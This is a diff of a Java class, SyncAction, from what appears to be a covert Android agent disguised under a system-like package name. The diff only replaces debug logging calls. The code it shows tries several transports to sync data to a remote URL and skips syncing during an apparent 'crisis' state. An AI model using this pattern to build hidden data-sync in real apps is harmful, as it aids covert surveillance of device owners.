@@ -11,8 +11,6 @@ package com.android.service.action;
 
 import java.util.Vector;
 
-import android.util.Log;
-
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
@@ -77,13 +75,13 @@ public abstract class SyncAction extends SubAction {
 		if(Cfg.DEBUG) Check.requires(transports != null, "execute: null transports");
 
 		if (status.synced == true) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: "
+			if(Cfg.DEBUG) Check.log( TAG + " Warn: "
 					+ "Already synced in this action: skipping");
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: "
+			if(Cfg.DEBUG) Check.log( TAG + " Warn: "
 					+ "SyncAction - no sync, we are in crisis");
 			return false;
 		}
@@ -98,17 +96,17 @@ public abstract class SyncAction extends SubAction {
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " execute transport: " + transport);
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " transport Sync url: " + transport.getUrl());
+			if(Cfg.DEBUG) Check.log( TAG + " execute transport: " + transport);
+			if(Cfg.DEBUG) Check.log( TAG + " transport Sync url: " + transport.getUrl());
 
 			if (transport.isAvailable()) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " execute: transport available");
+				if(Cfg.DEBUG) Check.log( TAG + " execute: transport available");
 				protocol.init(transport);
 
 				try {
 					ret = protocol.perform();
 				} catch (final ProtocolException e) {
-					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + e.toString());
+					if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
 					ret = false;
 				}
 
@@ -116,16 +114,16 @@ public abstract class SyncAction extends SubAction {
 				//wantReload = protocol.reload;
 
 			} else {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " execute: transport not available");
+				if(Cfg.DEBUG) Check.log( TAG + " execute: transport not available");
 			}
 
 			if (ret) {
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: SyncAction OK");
+				if(Cfg.DEBUG) Check.log( TAG + " Info: SyncAction OK");
 				status.synced = true;
 				return true;
 			}
 
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: SyncAction Unable to perform");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: SyncAction Unable to perform");
 		}
 
 		return false;
